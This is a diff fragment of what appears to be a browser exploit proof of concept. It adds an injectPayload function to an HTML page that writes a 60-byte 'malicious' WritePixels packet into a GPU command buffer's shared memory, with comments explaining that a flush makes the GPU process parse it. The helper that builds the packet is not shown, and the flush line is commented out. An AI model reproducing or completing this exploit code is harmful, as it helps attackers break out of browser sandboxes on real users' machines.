@@ -24,6 +24,18 @@
             // shared memory region associated with this canvas.
             console.log("[?] Interception successful. Now ready to inject WritePixelsINTERNAL...");
         }, 500);
+        function injectPayload(buffer, shm_id, mailbox) {
+            console.log("[!] Injecting payload into buffer...");
+            // 60-byte binary packet
+            const payload = buildMaliciousWritePixels(shm_id, mailbox); 
+            
+            // Write directly into the mapped buffer
+            buffer.set(payload, 0); 
+            
+            console.log("[+] Payload written. Triggering flush...");
+            // Triggering the flush tells the GPU process to start parsing the buffer
+            // command_buffer_proxy.flush(60); 
+        }
     </script>
 </body>
 </html>
